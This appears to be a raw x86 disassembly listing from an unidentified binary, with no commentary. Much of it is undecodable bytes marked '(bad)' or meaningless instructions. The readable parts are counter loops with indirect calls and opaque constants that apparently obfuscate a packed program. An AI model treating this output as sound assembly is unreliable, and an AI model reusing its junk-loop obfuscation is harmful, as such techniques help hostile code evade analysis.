  40a0ed:	sar    DWORD PTR [ecx+0x67],cl
  40a0f0:	add    DWORD PTR [edx],eax
  40a0f2:	mov    ah,0x22
  40a0f4:	push   esi
  40a0f5:	call   0xfbdb444d
  40a0fa:	jp     0x40a141
  40a0fc:	ffree  st(0)
  40a0fe:	gs pop ds
  40a100:	hlt    
  40a101:	(bad)  
  40a102:	cmp    bh,BYTE PTR [esi+eax*4]
  40a105:	mov    DWORD PTR [eax],0x7cd71e51
  40a10b:	sbb    ah,BYTE PTR [edx+0x28]
  40a10e:	sbb    DWORD PTR [esp+ebp*1-0x80],0xd9fe3a1f
  40a116:	mov    al,ds:0x160f6e54
  40a11b:	out    0x1b,al
  40a11d:	test   DWORD PTR [edi],ebx
  40a11f:	pop    edi
  40a120:	fiadd  WORD PTR [edi+edi*2+0x3a]
  40a124:	cmp    dl,dh
  40a126:	jmp    0x88a:0x71ab272e
  40a12d:	ret    
  40a12e:	(bad)  
  40a12f:	add    BYTE PTR [esp+edx*8+0x62],bl
  40a133:	inc    ecx
  40a134:	into   
  40a135:	shl    DWORD PTR [ecx-0x32f9c8a9],0xc4
  40a13c:	leave  
  40a13d:	push   ss
  40a13e:	xor    ch,bh
  40a140:	in     eax,0x7b
  40a142:	push   ss
  40a143:	mov    al,0xb0
  40a145:	pop    ecx
  40a146:	ds fs push ss
  40a149:	mov    WORD PTR [eax+eiz*4],cs
  40a14c:	jnp    0x40a1a0
  40a14e:	xchg   ebp,eax
  40a14f:	xchg   DWORD PTR [edi-0x16bae7f2],esi
  40a155:	ss mov esi,0x1202bf44
  40a15b:	dec    eax
  40a15c:	jbe    0x40a1d0
  40a15e:	mov    BYTE PTR [esi+0x28],cl
  40a161:	cmp    al,0x66
  40a163:	std    
  40a164:	xchg   ebx,eax
  40a165:	dec    esp
  40a166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a167:	ret    0xa8fd
  40a16a:	out    0x38,eax
  40a16c:	sahf   
  40a16d:	retf   
  40a16e:	sbb    edi,DWORD PTR [edi-0x6f59f8d9]
  40a174:	loop   0x40a1af
  40a176:	loope  0x40a197
  40a178:	loope  0x40a165
  40a17a:	inc    ebx
  40a17b:	mov    edx,0xeb9a9db1
  40a180:	in     al,dx
  40a181:	dec    ecx
  40a182:	shr    DWORD PTR [ebp-0x1c75851a],0xa4
  40a189:	stos   DWORD PTR es:[edi],eax
  40a18a:	test   al,0x72
  40a18c:	mov    edi,0xb7748ece
  40a191:	xlat   BYTE PTR ds:[ebx]
  40a192:	jnp    0x40a183
  40a194:	push   esp
  40a195:	ds inc eax
  40a197:	jb     0x40a11b
  40a199:	lods   eax,DWORD PTR ds:[esi]
  40a19a:	icebp  
  40a19b:	jno    0x40a217
  40a19d:	xchg   edx,eax
  40a19e:	jbe    0x40a175
  40a1a0:	ficomp DWORD PTR [edx-0x26]
  40a1a3:	push   ss
  40a1a4:	fadd   DWORD PTR [eax+0x32]
  40a1a7:	xor    DWORD PTR [eax],eax
  40a1a9:	(bad)  
  40a1ab:	sub    BYTE PTR [ecx-0x68855ea4],dh
  40a1b1:	inc    eax
  40a1b2:	and    DWORD PTR [ebx-0x2d],0x6b
  40a1b6:	xchg   esi,eax
  40a1b7:	mov    dl,0x68
  40a1b9:	dec    edx
  40a1ba:	inc    ebx
  40a1bb:	mov    edx,DWORD PTR [edx-0x77d8e0d3]
  40a1c1:	mov    bl,0x91
  40a1c3:	shl    bh,1
  40a1c5:	xlat   BYTE PTR ds:[ebx]
  40a1c6:	aam    0xce
  40a1c8:	std    
  40a1c9:	xor    eax,0x780bd5b0
  40a1ce:	sbb    eax,ebp
  40a1d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1d1:	pusha  
  40a1d2:	cwde   
  40a1d3:	imul   ecx,DWORD PTR [ecx],0x70965d19
  40a1d9:	retf   
  40a1da:	das    
  40a1db:	add    al,dh
  40a1dd:	mov    ebx,0x567c4db
  40a1e2:	sub    BYTE PTR [eax],dl
  40a1e4:	sbb    ch,BYTE PTR [esi+0x35]
  40a1e7:	inc    edi
  40a1e8:	loope  0x40a18f
  40a1ea:	adc    eax,0x48a3b7f4
  40a1ef:	pop    ebp
  40a1f0:	mov    edx,DWORD PTR ds:0x10835913
  40a1f6:	lea    ebx,[edi-0x5a50bb7d]
  40a1fc:	push   esi
  40a1fd:	jp     0x40a1f3
  40a1ff:	and    BYTE PTR [eax+0xd],bl
  40a202:	jno    0x40a233
  40a204:	or     esi,DWORD PTR [ebp+ecx*8-0x48eca44]
  40a20b:	or     ebx,DWORD PTR [edi+0x123e93fc]
  40a211:	cli    
  40a212:	push   0x4a351aa7
  40a217:	out    dx,al
  40a218:	add    BYTE PTR [eax],0x5e
  40a21b:	xor    bh,0x8d
  40a21e:	test   al,0xc1
  40a220:	mov    al,0x57
  40a222:	or     edi,esp
  40a224:	sbb    DWORD PTR [esp+edi*1+0x1d],edi
  40a228:	mov    edi,0xf776f94e
  40a22d:	rol    edi,1
  40a22f:	inc    ebp
  40a230:	cld    
  40a231:	rol    DWORD PTR [ebp+0x45c7f89c],1
  40a237:	fdiv   DWORD PTR [ebx]
  40a239:	test   DWORD PTR [eax+edi*8+0x45c7d213],ebx
  40a240:	aam    0x32
  40a242:	test   DWORD PTR [eax+edi*8-0x312da7f],ebx
  40a249:	inc    edx
  40a24a:	add    BYTE PTR [eax],al
  40a24c:	add    BYTE PTR [eax],al
  40a24e:	add    cl,ch
  40a250:	sldt   WORD PTR [eax]
  40a253:	add    BYTE PTR [ebx],dh
  40a255:	ror    BYTE PTR [ebx],cl
  40a257:	adc    eax,0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	cmp    ecx,DWORD PTR [ebp+ebp*8+0x70f54588]
  40a2cb:	jo     0x40a26c
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2e6
  40a2d1:	gs push edi
  40a2d3:	add    BYTE PTR fs:[ebx+0xada25cd],dl
  40a2da:	dec    edx
  40a2db:	xor    ah,0xe8
  40a2de:	aam    0xf6
  40a2e0:	pop    edi
  40a2e1:	cmp    BYTE PTR gs:[ecx-0x7b568cb4],0xc
  40a2e9:	add    eax,0xc2881dd4
  40a2ee:	xchg   esp,eax
  40a2ef:	aam    0x99
  40a2f1:	into   
  40a2f2:	sti    
  40a2f3:	mov    esi,0x19e63e91
  40a2f8:	xchg   ebx,eax
  40a2f9:	adc    esp,eax
  40a2fb:	and    DWORD PTR [ecx+0x15aa20a7],edx
  40a301:	(bad)  
  40a303:	mov    bl,0x77
  40a305:	in     eax,dx
  40a306:	xchg   BYTE PTR [edi-0x17],al
  40a309:	outs   dx,BYTE PTR ds:[esi]
  40a30a:	aaa    
  40a30b:	push   ebx
  40a30c:	or     al,0x41
  40a30e:	mov    edi,0xcc6eec0d
  40a313:	xor    BYTE PTR [esi+ebx*8-0x37],dh
  40a317:	js     0x40a2e2
  40a319:	sub    eax,0xe21171fe
  40a31e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a31f:	ja     0x40a367
  40a321:	dec    ebp
  40a322:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a324:	sbb    eax,0x9cd723a7
  40a329:	jl     0x40a2ba
  40a32b:	and    al,0x10
  40a32d:	stc    
  40a32e:	mov    eax,0xb8d515f6
  40a333:	in     al,dx
  40a334:	mov    bl,BYTE PTR [eax]
  40a336:	and    ch,BYTE PTR [ebx+0x1e]
  40a339:	and    dh,bh
  40a33b:	inc    edi
  40a33c:	mov    dl,BYTE PTR [eax+ecx*8+0x5878cedd]
  40a343:	xchg   edx,eax
  40a344:	add    al,0x35
  40a346:	adc    DWORD PTR [esp+eiz*8-0x3f9d542a],edx
  40a34d:	es pop edx
  40a34f:	(bad)  
  40a350:	add    DWORD PTR [eax+0x1092bce],eax
  40a356:	push   ebx
  40a357:	aas    
  40a358:	or     DWORD PTR [esi-0x48],0xffffff91
  40a35c:	cmp    al,dl
  40a35e:	sub    BYTE PTR [ebx+0x24],al
  40a361:	push   ecx
  40a362:	or     eax,DWORD PTR [ebx+0x478c5e19]
  40a368:	inc    esi
  40a369:	jecxz  0x40a377
  40a36b:	aas    
  40a36c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a36d:	add    eax,0x897fb043
  40a372:	xchg   ebx,eax
  40a373:	jg     0x40a33b
  40a375:	jne    0x40a39c
  40a377:	push   edi
  40a378:	pop    ebp
  40a379:	or     bl,dl
  40a37b:	lds    edi,FWORD PTR [ebx-0x6ccfbd19]
  40a381:	xchg   edi,eax
  40a382:	loope  0x40a3bc
  40a384:	adc    ecx,eax
  40a386:	mov    BYTE PTR [edx-0x1c],ch
  40a389:	out    dx,al
  40a38a:	sub    DWORD PTR [edi+edi*1],esi
  40a38d:	inc    BYTE PTR [ecx+0x8]
  40a390:	call   FWORD PTR [esi-0x1b]
  40a393:	aaa    
  40a394:	outs   dx,DWORD PTR ds:[esi]
  40a395:	and    DWORD PTR [ecx],esp
  40a397:	sub    eax,0x971164d2
  40a39c:	add    al,dl
  40a39e:	mov    bh,0x95
  40a3a0:	(bad)  
  40a3a1:	lods   eax,DWORD PTR ds:[esi]
  40a3a2:	jns    0x40a3ea
  40a3a4:	mov    ebp,0x9c656e45
  40a3a9:	mov    BYTE PTR [edx+0x5cfafbdb],dl
  40a3af:	pop    edx
  40a3b0:	and    eax,0x9efdfba7
  40a3b5:	in     al,0x69
  40a3b7:	fisttp WORD PTR [eax-0x6e179370]
  40a3bd:	icebp  
  40a3be:	adc    DWORD PTR [ebx-0x5e],edx
  40a3c1:	push   edi
  40a3c2:	push   cs
  40a3c3:	xlat   BYTE PTR ds:[ebx]
  40a3c4:	test   eax,0xb29abd5a
  40a3c9:	cmp    ah,BYTE PTR ds:0x86bdab11
  40a3cf:	out    0xcc,eax
  40a3d1:	imul   ecx,DWORD PTR [esi],0x818faf4b
  40a3d7:	shr    BYTE PTR [eax+esi*8-0x127292aa],1
  40a3de:	leave  
  40a3df:	dec    ecx
  40a3e0:	pop    ebp
  40a3e1:	ss rcl ecx,cl
  40a3e4:	jl     0x40a422
  40a3e6:	sbb    eax,0x10a90ecf
  40a3eb:	inc    edi
  40a3ec:	dec    esi
  40a3ed:	push   es
  40a3ee:	dec    eax
  40a3ef:	into   
  40a3f0:	loop   0x40a3db
  40a3f2:	lea    ecx,[edx]
  40a3f4:	fwait
  40a3f5:	xchg   BYTE PTR [esi+0x42826394],al
  40a3fb:	jae    0x40a38a
  40a3fd:	loope  0x40a433
  40a3ff:	jecxz  0x40a473
  40a401:	dec    ebp
  40a402:	xchg   ecx,eax
  40a403:	jno    0x40a3b2
  40a405:	daa    
  40a406:	stc    
  40a407:	clc    
  40a408:	cmp    eax,edx
  40a40a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a40b:	push   ebp
  40a40c:	jb     0x40a43a
  40a40e:	pop    ebp
  40a40f:	int3   
  40a410:	add    ecx,DWORD PTR [eax+0x26]
  40a413:	data16 (bad) 
  40a415:	loop   0x40a407
  40a417:	xor    esp,DWORD PTR ds:0xc8033a34
  40a41d:	js     0x40a3a8
  40a41f:	pop    eax
  40a420:	hlt    
  40a421:	imul   edi,DWORD PTR [edx+eax*2+0x36],0xfffffff7
  40a426:	inc    edx
  40a427:	xchg   edx,eax
  40a428:	mov    ch,0x16
  40a42a:	retf   0xe746
  40a42d:	imul   eax,eax,0xffffffe4
  40a430:	and    eax,0x623f2eae
  40a435:	mov    DWORD PTR [bx+di-0x15],esp
  40a439:	dec    esp
  40a43a:	mov    edi,0xa4aefe93
  40a43f:	leave  
  40a440:	out    0x3a,al
  40a442:	retf   0x5e4
  40a445:	ret    0xe9c0
  40a448:	mov    esi,0x90ef7780
  40a44d:	and    al,dh
  40a44f:	mov    cl,0xf6
  40a451:	jae    0x40a4d1
  40a453:	ror    BYTE PTR [edi],0x5a
  40a456:	cmp    al,0x2b
  40a458:	loopne 0x40a450
  40a45a:	xor    al,0x46
  40a45c:	ins    DWORD PTR es:[edi],dx
  40a45d:	ror    al,0x3c
  40a460:	outs   dx,DWORD PTR ds:[esi]
  40a461:	mov    ebp,0x19fe438c
  40a466:	jnp    0x40a3fb
  40a468:	xchg   ecx,eax
  40a469:	mov    dl,ah
  40a46b:	inc    eax
  40a46c:	or     BYTE PTR [eax-0x5fbd8c0b],0x1c
  40a473:	(bad)  
  40a474:	fdivrp st(3),st
  40a476:	adc    bh,0x72
  40a479:	sub    eax,eax
  40a47b:	xchg   esi,eax
  40a47c:	hlt    
  40a47d:	jno    0x9eee14b
  40a483:	leave  
  40a484:	icebp  
  40a485:	and    DWORD PTR [ecx+0x1364bb36],edi
  40a48b:	lahf   
  40a48c:	jmp    0x8742:0x66c45e8
  40a493:	outs   dx,BYTE PTR ds:[esi]
  40a494:	sub    al,0x8a
  40a496:	or     al,0x6a
  40a498:	xlat   BYTE PTR ds:[ebx]
  40a499:	sbb    bh,dl
  40a49b:	fistp  QWORD PTR [ebx]
  40a49d:	rcl    ebp,1
  40a49f:	inc    edi
  40a4a0:	or     ah,dl
  40a4a2:	pop    ecx
  40a4a3:	push   DWORD PTR [edi+0x6541ff41]
  40a4a9:	and    bl,dh
  40a4ab:	pop    ss
  40a4ac:	push   0xffffffbd
  40a4ae:	add    al,0xfc
  40a4b0:	ds daa 
  40a4b2:	out    dx,al
  40a4b3:	sahf   
  40a4b4:	lods   eax,DWORD PTR ds:[esi]
  40a4b5:	aam    0x4e
  40a4b7:	push   ds
  40a4b8:	mov    al,ds:0xa852e84a
  40a4bd:	(bad)  
  40a4be:	cmp    ah,dl
  40a4c0:	inc    esp
  40a4c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c2:	fs xor al,0x35
  40a4c5:	mov    cl,0xff
  40a4c7:	jne    0x40a529
  40a4c9:	inc    ebx
  40a4ca:	push   ebp
  40a4cb:	mov    eax,ds:0x48d8aa83
  40a4d0:	sbb    cl,BYTE PTR ds:0x35a54ad9
  40a4d6:	mov    WORD PTR [ecx-0x6f],?
  40a4d9:	xor    BYTE PTR [edi],bl
  40a4db:	add    al,0x18
  40a4dd:	int3   
  40a4de:	pop    esp
  40a4df:	pop    ds
  40a4e0:	pusha  
  40a4e1:	mov    bl,0x8b
  40a4e3:	retf   0x4923
  40a4e6:	out    0x6a,al
  40a4e8:	mov    edi,0x4634a5d0
  40a4ed:	jbe    0x40a4df
  40a4ef:	aas    
  40a4f0:	stos   BYTE PTR es:[edi],al
  40a4f1:	xchg   esp,eax
  40a4f2:	mov    edi,DWORD PTR [edi-0x1dc16ec0]
  40a4f8:	xchg   BYTE PTR [ecx-0x68],bh
  40a4fb:	xor    ecx,edx
  40a4fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4fe:	enter  0xe03e,0x6c
  40a502:	pop    edi
  40a503:	fmul   DWORD PTR [eax-0x127936d3]
  40a509:	dec    ecx
  40a50a:	fwait
  40a50b:	iret   
  40a50c:	in     eax,0xff
  40a50e:	bound  ecx,QWORD PTR [ecx+0x6e]
  40a511:	mov    edx,0x64194d9b
  40a516:	push   ecx
  40a517:	cdq    
  40a518:	adc    eax,0x2b3bcc41
  40a51d:	xor    eax,0x1497e4f2
  40a522:	or     ecx,DWORD PTR [ebx+0x68308b56]
  40a528:	fwait
  40a529:	mov    dl,0xc6
  40a52b:	adc    BYTE PTR [edi+ebp*2],dh
  40a52e:	pop    esp
  40a52f:	or     edi,DWORD PTR [ebx-0x532aca43]
  40a535:	adc    ah,cl
  40a537:	test   BYTE PTR [ebp*4-0x64d58325],dl
  40a53e:	push   esp
  40a53f:	leave  
  40a540:	cld    
  40a541:	ror    DWORD PTR [ebx],cl
  40a543:	pop    eax
  40a544:	ins    DWORD PTR es:[edi],dx
  40a545:	(bad)  
  40a547:	stos   BYTE PTR es:[edi],al
  40a548:	mov    ebx,0xa5d66316
  40a54d:	push   ds
  40a54e:	aam    0x4e
  40a550:	or     edi,edi
  40a552:	pop    ebx
  40a553:	push   0x7d876d41
  40a558:	and    DWORD PTR [esi-0x2c],eax
  40a55b:	adc    al,0x2d
  40a55d:	jo     0x40a54c
  40a55f:	add    eax,0x3526b1e9
  40a564:	call   0x45f2930e
  40a569:	(bad)  
  40a56a:	push   ebx
  40a56b:	push   edx
  40a56c:	gs stc 
  40a56e:	imul   ebp,edi,0x65
  40a571:	rcr    DWORD PTR [ebp+0x1e7ed55],1
  40a577:	add    DWORD PTR [ecx-0x68],0xa7d25931
  40a57e:	popf   
  40a57f:	jmp    0xb782:0xf0a5a805
  40a586:	pop    es
  40a587:	push   ebx
  40a588:	icebp  
  40a589:	cwde   
  40a58a:	ds jno 0x40a546
  40a58d:	xchg   ecx,eax
  40a58e:	adc    edx,DWORD PTR [edi-0x10]
  40a591:	ror    cl,cl
  40a593:	or     al,0x68
  40a595:	add    eax,0xa0893c56
  40a59a:	pop    ebp
  40a59b:	(bad)
  40a59e:	mov    bl,0x7e
  40a5a0:	(bad)  
  40a5a1:	cwde   
  40a5a2:	jg     0x40a539
  40a5a4:	mov    eax,0xd25bd06d
  40a5a9:	pusha  
  40a5aa:	ja     0x40a55b
  40a5ac:	mov    ?,WORD PTR [edi+0x7d753177]
  40a5b2:	iret   
  40a5b3:	adc    eax,0x2f79caff
  40a5b8:	outs   dx,BYTE PTR ds:[esi]
  40a5b9:	sub    dh,BYTE PTR [eax+0x64eb037a]
  40a5bf:	daa    
  40a5c0:	call   0xe2f8:0x2e485e63
  40a5c7:	cmc    
  40a5c8:	inc    edi
  40a5c9:	fidiv  WORD PTR [eax+0x6cb86b0e]
  40a5cf:	mov    cl,0xba
  40a5d1:	ja     0x40a5dc
  40a5d3:	sub    al,0x59
  40a5d5:	mov    ecx,0x2ffadf5e
  40a5da:	and    ch,BYTE PTR [ebx]
  40a5dc:	jbe    0x40a612
  40a5de:	xchg   ebx,eax
  40a5df:	call   0x7d95:0x26319de3
  40a5e6:	rcr    ah,0xdc
  40a5e9:	jecxz  0x40a5c3
  40a5eb:	jmp    0x40a63f
  40a5ed:	mov    eax,0xd2369337
  40a5f2:	nop
  40a5f3:	mov    ch,0x90
  40a5f5:	jno    0x40a60f
  40a5f7:	lahf   
  40a5f8:	add    DWORD PTR [esi+0x2a],ecx
  40a5fb:	push   ebp
  40a5fc:	cdq    
  40a5fd:	xor    ebx,0xc311d263
  40a603:	imul   esp,eax,0x32
  40a606:	sub    BYTE PTR [ecx+0x64],al
  40a609:	jge    0x40a636
  40a60b:	fld    TBYTE PTR [edi-0x776ede1b]
  40a611:	cmp    eax,0xea0f3377
  40a616:	push   edi
  40a618:	push   0x8bfe1ac1
  40a61d:	add    al,0xb5
  40a61f:	mov    dl,0x4f
  40a621:	ja     0x40a63e
  40a623:	dec    eax
  40a624:	scas   al,BYTE PTR es:[edi]
  40a625:	xchg   DWORD PTR [esi],esp
  40a627:	bound  ebp,QWORD PTR [esi-0x1dd6d72b]
  40a62d:	push   0x5a
  40a62f:	fisttp WORD PTR [edx-0x7eae0ab6]
  40a635:	jno    0x40a68e
  40a637:	pop    ebp
  40a638:	push   eax
  40a639:	stc    
  40a63a:	mov    bh,0x99
  40a63c:	retf   
  40a63d:	aad    0xba
  40a63f:	pop    edi
  40a640:	arpl   bp,bx
  40a642:	fstp   QWORD PTR cs:[ebp+0x79af7230]
  40a649:	mov    eax,0xc80494fd
  40a64e:	enter  0xef2d,0x51
  40a652:	les    ebx,FWORD PTR [edx]
  40a654:	in     eax,dx
  40a655:	or     eax,DWORD PTR [edi]
  40a657:	jmp    0x82d4:0x7320db46
  40a65e:	fadd   DWORD PTR [ecx]
  40a660:	fst    QWORD PTR [esi+0x16]
  40a663:	ficom  DWORD PTR [edx]
  40a665:	shr    BYTE PTR [ebx+0xa049dc2],cl
  40a66b:	hlt    
  40a66c:	pop    ebp
  40a66d:	mov    BYTE PTR [eax-0x59],ch
  40a670:	xchg   esi,eax
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	gs jmp 0x7070:0xf1e47ebc
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a888
  40a860:	mov    esi,0xd29176e3
  40a865:	push   ecx
  40a866:	(bad)  
  40a867:	cmp    al,0x24
  40a869:	lods   al,BYTE PTR ds:[esi]
  40a86a:	jecxz  0x40a8cf
  40a86c:	mov    esi,0xd107f4e6
  40a871:	test   DWORD PTR [edx-0x33],ebx
  40a874:	dec    ecx
  40a875:	ins    DWORD PTR es:[edi],dx
  40a876:	in     al,0xec
  40a878:	int    0xd9
  40a87a:	mov    eax,0xba33468c
  40a87f:	push   0x44193d4e
  40a884:	mov    ds:0x14673490,eax
  40a889:	je     0x40a894
  40a88b:	(bad)  
  40a88c:	jl     0x40a837
  40a88e:	aas    
  40a88f:	mov    eax,fs:0xafe3e714
  40a895:	xlat   BYTE PTR ds:[ebx]
  40a896:	test   eax,0x2f928342
  40a89b:	das    
  40a89c:	in     al,0xf8
  40a89e:	push   esp
  40a89f:	sahf   
  40a8a0:	dec    esp
  40a8a1:	xlat   BYTE PTR ds:[ebx]
  40a8a2:	loopne 0x40a8d8
  40a8a4:	dec    eax
  40a8a5:	xchg   ebx,eax
  40a8a6:	jmp    0x40a8c7
  40a8a8:	or     BYTE PTR [edx-0xb713000],al
  40a8ae:	sbb    esp,DWORD PTR [eax-0x47]
  40a8b1:	pop    esi
  40a8b2:	xchg   BYTE PTR [ecx-0x24],al
  40a8b5:	scas   eax,DWORD PTR es:[edi]
  40a8b6:	ds push edx
  40a8b8:	pop    esp
  40a8b9:	and    DWORD PTR ds:0x2403b87e,ecx
  40a8bf:	aas    
  40a8c0:	mov    bh,bl
  40a8c2:	dec    eax
  40a8c4:	lods   eax,DWORD PTR ds:[esi]
  40a8c5:	call   0xc805e424
  40a8ca:	es pop esp
  40a8cc:	shl    BYTE PTR [eax+0x5936c25e],1
  40a8d2:	mov    ecx,0x74fba8e7
  40a8d7:	jnp    0x40a920
  40a8d9:	int    0x30
  40a8db:	(bad)  
  40a8dc:	imul   edx,DWORD PTR [ebx+esi*2-0x4c0bec9],0xdea05896
  40a8e7:	retf   
  40a8e8:	pop    edx
  40a8e9:	test   DWORD PTR [ebp+0x1dbe62eb],esp
  40a8ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8f0:	sub    esp,DWORD PTR [ecx-0x6b8dad29]
  40a8f6:	sbb    bh,ah
  40a8f8:	das    
  40a8f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8fa:	and    DWORD PTR [eax],esi
  40a8fc:	cwde   
  40a8fd:	mov    ebp,0xaef8d359
  40a902:	add    ebp,DWORD PTR [edx]
  40a904:	arpl   WORD PTR [ebx+edx*8-0x69],ax
  40a908:	mov    fs:0x9ee15161,al
  40a90e:	outs   dx,BYTE PTR ds:[esi]
  40a90f:	fistp  DWORD PTR [ecx-0x1b]
  40a912:	jmp    0x40a94b
  40a914:	lock dec ecx
  40a916:	mov    dl,BYTE PTR [esi+0x5ca6ff45]
  40a91c:	popa   
  40a91d:	loop   0x40a915
  40a91f:	jmp    0xd93dfa66
  40a924:	pop    esp
  40a925:	jecxz  0x40a8eb
  40a927:	push   ss
  40a928:	and    eax,0x81f044ed
  40a92d:	(bad)  
  40a92e:	xor    ch,BYTE PTR [esi-0x76]
  40a931:	pop    eax
  40a932:	nop
  40a933:	cmp    DWORD PTR [ecx-0x57],esp
  40a936:	inc    eax
  40a937:	push   ecx
  40a938:	jno    0x40a9ae
  40a93a:	imul   ecx,DWORD PTR [ebx],0xf1f46652
  40a940:	cli    
  40a941:	inc    esi
  40a942:	xchg   cx,ax
  40a944:	xlat   BYTE PTR ds:[ebx]
  40a945:	sbb    al,0x74
  40a947:	pop    ds
  40a948:	and    al,0x6
  40a94a:	and    esp,0x94cdda1c
  40a950:	dec    esi
  40a951:	imul   ecx,DWORD PTR [ebp-0x3],0xa2a30bcf
  40a958:	xor    BYTE PTR [edx-0x1cb39f36],ah
  40a95e:	inc    esp
  40a95f:	push   esp
  40a960:	push   ecx
  40a961:	into   
  40a962:	int3   
  40a963:	mov    ebx,0xfa50a656
  40a968:	xor    eax,0xdd1dd9a1
  40a96d:	push   0xc713e517
  40a972:	addr16 dec edi
  40a974:	dec    esi
  40a975:	mov    esp,0x197d8e44
